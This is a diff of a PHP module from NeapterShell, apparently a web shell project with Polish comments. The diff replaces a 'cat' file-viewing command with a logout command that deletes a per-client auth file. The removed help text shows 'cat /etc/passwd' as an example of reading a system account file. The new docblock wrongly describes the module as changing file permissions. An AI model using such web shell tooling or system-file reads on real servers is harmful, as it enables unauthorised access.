@@ -10,7 +10,7 @@
  */
 
 /**
- * Wyswietlanie zawartosci pliku
+ * Zmienianie uprawnien dla pliku
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
  * @copyright Copyright (c) 2012, Krzysztof Otręba
@@ -18,7 +18,7 @@
  * @package    NeapterShell
  * @subpackage Modules
  */
-class ModuleCat extends ModuleAbstract
+class ModuleLogout extends ModuleAbstract
 {
     /**
      * Dostepna lista komend
@@ -28,7 +28,11 @@ class ModuleCat extends ModuleAbstract
      */
     public static function getCommands()
     {
-        return array('cat');
+        return array(
+            'logout',
+            'quit',
+            'exit'
+        );
     }
 
     /**
@@ -42,7 +46,7 @@ class ModuleCat extends ModuleAbstract
         /**
          * Wersja Data Autor
          */
-        return '1.01 2011-06-23 - <krzotr@gmail.com>';
+        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
     }
 
     /**
@@ -54,13 +58,10 @@ class ModuleCat extends ModuleAbstract
     public static function getHelp()
     {
         return <<<DATA
-Wyświetlanie zawartości pliku
+exit, quit, logout - Wylogowanie z shella
 
-	Użycie:
-		cat ścieżka_do_pliku
-
-	Przykład:
-		cat /etc/passwd
+    Użycie:
+        logout
 DATA;
     }
 
@@ -72,23 +73,30 @@ DATA;
      */
     public function get()
     {
-        /**
-         * Help
-         */
-        if ($this->oArgs->getNumberOfParams() !== 1) {
-            return self::getHelp();
-        }
-
-        $sFilePath = $this->oArgs->getParam(0);
 
         /**
-         * Plik zrodlowy musi istniec
+         * Sciezka do pliku
          */
-        if (!is_file($sFilePath)) {
-            return sprintf('Plik "%s" nie istnieje', $sFilePath);
+        $sFilepath = $this->sTmp . '/' . $this->sPrefix . md5(Request::getServer('REMOTE_ADDR') . Request::getServer('USER_AGENT')) . '_auth';
+
+        /**
+         * Czy plik z autoryzacja istnieje
+         */
+        if (is_file($sFilepath)) {
+            /**
+             * Usuwanie pliku
+             */
+            if (unlink($sFilepath)) {
+                echo 'Zostałeś wylogowany';
+                exit;
+            } else {
+                echo 'Nie zostałeś wylogowany';
+                exit;
+            }
         }
 
-        return htmlspecialchars(file_get_contents($sFilePath));
+        echo 'See you (:';
+        exit;
     }
 
 }
